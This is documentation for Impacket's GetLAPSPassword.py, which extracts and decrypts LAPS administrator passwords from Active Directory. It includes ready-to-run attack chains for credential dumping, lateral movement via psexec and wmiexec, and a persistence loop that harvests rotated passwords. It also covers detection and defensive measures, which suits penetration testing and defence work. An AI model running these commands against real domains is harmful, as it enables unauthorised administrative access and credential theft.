# GetLAPSPassword.py

## Overview
`GetLAPSPassword.py` is a specialized tool for extracting LAPS (Local Administrator Password Solution) passwords from Active Directory environments. This tool is categorized under Active Directory and provides functionality for retrieving both LAPS v1 and LAPS v2 passwords from domain computers where the user has appropriate read permissions.

## Detailed Description
LAPS (Local Administrator Password Solution) is a Microsoft solution that automatically manages local administrator passwords on domain-joined computers. The passwords are stored in Active Directory attributes and rotated on a regular schedule. This tool extracts those passwords by querying the relevant AD attributes and, in the case of LAPS v2, decrypting the encrypted password blobs.

The tool supports both legacy LAPS (LAPS v1) which stores passwords in the `ms-Mcs-AdmPwd` attribute as plaintext, and the newer LAPS v2 which stores encrypted passwords in the `msLAPS-EncryptedPassword` attribute. For LAPS v2, the tool implements the complete decryption process including connecting to the MS-GKDI service to retrieve encryption keys.

### Key Features:
- **LAPS v1 Support**: Extract plaintext passwords from `ms-Mcs-AdmPwd` attribute
- **LAPS v2 Support**: Decrypt encrypted passwords from `msLAPS-EncryptedPassword` attribute
- **Key Management**: Automatic retrieval and caching of Group Key Distribution Service (GKDI) keys
- **Flexible Targeting**: Query specific computers or enumerate all LAPS-enabled systems
- **Multiple Output Formats**: Console table output and tab-delimited file export
- **Authentication Methods**: Support for password, hash, and Kerberos authentication

### Technical Details:
- Uses LDAP for querying Active Directory computer objects
- Implements MS-GKDI RPC protocol for LAPS v2 key retrieval
- Performs AES decryption of LAPS v2 encrypted password blobs
- Supports both LDAP and LDAPS connections for secure communication
- Implements proper ASN.1 parsing for encrypted content structures

## Command Line Options

```
usage: GetLAPSPassword.py [-h] [-computer computername] [-ts] [-debug] [-outputfile OUTPUTFILE]
                          [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                          [-dc-ip ip address] [-dc-host hostname] [-ldaps]
                          target

Required Arguments:
  target                domain[/username[:password]]

Optional Arguments:
  -computer computername Target a specific computer by its name
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -outputfile OUTPUTFILE Outputs to a file (tab-delimited format)

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

Connection:
  -dc-ip ip address     IP Address of the domain controller
  -dc-host hostname     Hostname of the domain controller to use
  -ldaps                Enable LDAPS (LDAP over SSL) - required for Windows Server 2025
```

## Usage Examples

### Basic LAPS Password Extraction
```bash
# Extract all LAPS passwords (requires appropriate AD permissions)
python3 GetLAPSPassword.py domain.com/admin:password

# Extract LAPS passwords using NTLM hash
python3 GetLAPSPassword.py -hashes :5e884898da28047151d0e56f8dc6292773603d0d domain.com/admin

# Extract LAPS passwords using Kerberos authentication
python3 GetLAPSPassword.py -k domain.com/admin:password
```

### Targeting Specific Computers
```bash
# Extract LAPS password for specific computer
python3 GetLAPSPassword.py domain.com/admin:password -computer WORKSTATION01

# Target computer using different authentication methods
python3 GetLAPSPassword.py -hashes :ntlmhash domain.com/admin -computer SERVER01
python3 GetLAPSPassword.py -k domain.com/admin:password -computer DC01
```

### Output and Logging Options
```bash
# Save results to file
python3 GetLAPSPassword.py domain.com/admin:password -outputfile laps_passwords.txt

# Debug mode with timestamps
python3 GetLAPSPassword.py -debug -ts domain.com/admin:password

# Combination of options
python3 GetLAPSPassword.py -debug -ts -outputfile results.txt domain.com/admin:password -computer TARGET
```

### Secure Connection Options
```bash
# Use LDAPS for encrypted communication
python3 GetLAPSPassword.py -ldaps domain.com/admin:password

# Specify domain controller explicitly
python3 GetLAPSPassword.py -dc-ip 192.168.1.10 domain.com/admin:password

# Use specific DC hostname
python3 GetLAPSPassword.py -dc-host dc.domain.com domain.com/admin:password

# Combine secure options
python3 GetLAPSPassword.py -ldaps -dc-host dc.domain.com domain.com/admin:password
```

### Advanced Authentication
```bash
# Use AES key for Kerberos
python3 GetLAPSPassword.py -aesKey 32characterhexkey -k domain.com/admin

# No password prompt (for Kerberos ticket cache)
python3 GetLAPSPassword.py -no-pass -k domain.com/admin

# Anonymous binding (if allowed by domain policy)
python3 GetLAPSPassword.py domain.com/
```

## Attack Chain Integration

### Post-Compromise LAPS Extraction
```bash
# Step 1: Obtain domain credentials through various methods
python3 secretsdump.py domain.com/user:password@dc.domain.com

# Step 2: Use obtained credentials to extract LAPS passwords
python3 GetLAPSPassword.py -hashes :extracted_hash domain.com/admin

# Step 3: Use LAPS passwords for lateral movement
python3 psexec.py ./administrator:extracted_laps_password@target-computer.domain.com
```

### LAPS Enumeration for Privilege Escalation
```bash
# Step 1: Enumerate LAPS passwords from compromised account
python3 GetLAPSPassword.py domain.com/low_priv_user:password -outputfile laps_enum.txt

# Step 2: Identify high-value targets with accessible LAPS passwords
grep -i "dc\|server\|admin" laps_enum.txt

# Step 3: Use LAPS passwords to access critical systems
python3 wmiexec.py ./administrator:laps_password@critical-server.domain.com
```

### Cross-Domain LAPS Extraction
```bash
# Step 1: Extract LAPS passwords from parent domain
python3 GetLAPSPassword.py parent.domain.com/admin:password

# Step 2: Extract LAPS passwords from child domains
python3 GetLAPSPassword.py child.parent.domain.com/admin:password

# Step 3: Extract LAPS passwords from trusted domains
python3 GetLAPSPassword.py trusted.domain.com/admin:password
```

### LAPS v2 Specific Operations
```bash
# Step 1: Identify LAPS v2 environments (Windows Server 2022+)
python3 GetLAPSPassword.py -debug domain.com/admin:password -computer WIN11-CLIENT

# Step 2: Ensure proper RPC connectivity for GKDI key retrieval
python3 GetLAPSPassword.py -dc-ip 192.168.1.10 domain.com/admin:password

# Step 3: Handle encrypted password blobs with key caching
python3 GetLAPSPassword.py domain.com/admin:password -outputfile lapsv2_results.txt
```

### Persistence Through LAPS Monitoring
```bash
# Step 1: Extract current LAPS passwords and expiration times
python3 GetLAPSPassword.py domain.com/admin:password -outputfile baseline_laps.txt

# Step 2: Monitor for LAPS password changes over time
while true; do
  python3 GetLAPSPassword.py domain.com/admin:password -outputfile current_laps.txt
  diff baseline_laps.txt current_laps.txt
  sleep 3600  # Check every hour
done

# Step 3: Use newly rotated passwords as they become available
# Monitor domain for password change events and extract new passwords
```

## Prerequisites and Permissions

### Required Active Directory Permissions
- **Read Permission**: On computer objects in Active Directory
- **Attribute Access**: Read access to `ms-Mcs-AdmPwd` (LAPS v1) or `msLAPS-EncryptedPassword` (LAPS v2)
- **Extended Rights**: May require "Read LAPS Password" extended right in some environments
- **GKDI Access**: For LAPS v2, RPC access to Group Key Distribution Service

### Account Requirements
- **Domain Account**: Valid domain credentials (cannot be used anonymously in most cases)
- **Privileged Account**: Often requires accounts with elevated AD permissions
- **Service Account**: Accounts specifically delegated LAPS read permissions

### Network Requirements
- **LDAP Access**: TCP 389 (or 636 for LDAPS) to domain controllers
- **RPC Access**: TCP 135 + dynamic ports for LAPS v2 GKDI communication
- **DNS Resolution**: Ability to resolve domain controller names

## LAPS Version Differences

### LAPS v1 (Legacy LAPS)
- **Storage**: Plaintext passwords in `ms-Mcs-AdmPwd` attribute
- **Expiration**: Stored in `ms-Mcs-AdmPwdExpirationTime` attribute
- **Encryption**: No encryption, passwords stored as plaintext in AD
- **Compatibility**: Windows 7+ with LAPS client installed

### LAPS v2 (Windows LAPS)
- **Storage**: Encrypted passwords in `msLAPS-EncryptedPassword` attribute
- **Expiration**: Included in encrypted blob structure
- **Encryption**: AES-256 encryption with GKDI-managed keys
- **Compatibility**: Windows Server 2022+, Windows 11+ with built-in support

## Security Implications

### Attack Opportunities
- **Lateral Movement**: Use extracted passwords for administrative access to computers
- **Privilege Escalation**: Local administrator access on domain computers
- **Persistence**: Regular password rotation requires ongoing monitoring
- **Domain Escalation**: High-value targets may include domain controllers

### Detection Indicators
- **LDAP Queries**: Unusual queries for LAPS-related attributes
- **GKDI Access**: RPC connections to Group Key Distribution Service
- **Attribute Access**: Access to sensitive computer object attributes
- **Bulk Enumeration**: Mass querying of computer objects with LAPS attributes

### Defensive Measures
- **Permission Hardening**: Restrict who can read LAPS passwords
- **Audit Logging**: Monitor access to LAPS-related attributes
- **Extended Rights**: Use "Read LAPS Password" extended right for granular control
- **Network Monitoring**: Monitor for unusual LDAP and RPC traffic patterns

## Common Issues and Troubleshooting

### Permission Denied Errors
```bash
# Error: Access denied reading LAPS attribute
# Solution: Verify account has appropriate permissions
python3 GetLAPSPassword.py -debug domain.com/user:password -computer TARGET

# Check if account has "Read LAPS Password" extended right
# Use ADSIEdit or PowerShell to verify permissions
```

### LAPS v2 Decryption Failures
```bash
# Error: Cannot unpack msLAPS-EncryptedPassword blob
# Solution: Ensure RPC connectivity to GKDI service
python3 GetLAPSPassword.py -debug -dc-ip 192.168.1.10 domain.com/admin:password

# Error: GKDI key retrieval failed
# Solution: Verify account has access to Group Key Distribution Service
# Check if GKDI service is running on domain controller
```

### Connection Issues
```bash
# Error: LDAP connection failed
# Solution: Check network connectivity and authentication
python3 GetLAPSPassword.py -debug domain.com/admin:password

# Error: SSL/TLS issues with LDAPS
# Solution: Verify certificate trust and LDAPS configuration
python3 GetLAPSPassword.py -ldaps -debug domain.com/admin:password
```

### Computer Not Found Errors
```bash
# Error: Specified computer not found
# Solution: Verify computer name and domain membership
python3 GetLAPSPassword.py domain.com/admin:password -computer CORRECT-NAME$

# Check if computer has LAPS enabled
# Verify computer object exists in AD with proper attributes
```

## Output Format Examples

### Console Output
```
Computer           Password          Expiration
---------          --------          ----------
WORKSTATION01$     P@ssw0rd123!      2024-06-15 10:30:00
SERVER01$          Secure789#        2024-06-16 14:20:00
DC01$              Admin456$         2024-06-17 09:15:00
```

### File Output (Tab-Delimited)
```
Computer	Password	Expiration
WORKSTATION01$	P@ssw0rd123!	2024-06-15 10:30:00
SERVER01$	Secure789#	2024-06-16 14:20:00
DC01$	Admin456$	2024-06-17 09:15:00
```

## Related Tools
- [GetADUsers.py](GetADUsers.md) - Enumerate domain users and attributes
- [GetADComputers.py](GetADComputers.md) - Enumerate domain computers
- [psexec.py](psexec.md) - Use extracted passwords for remote execution
- [wmiexec.py](wmiexec.md) - Execute commands using LAPS credentials
- [secretsdump.py](secretsdump.md) - Extract other types of credentials
- [dacledit.py](dacledit.md) - Modify permissions for LAPS access

---

*This documentation is based on the actual source code and functionality of GetLAPSPassword.py from Impacket.*
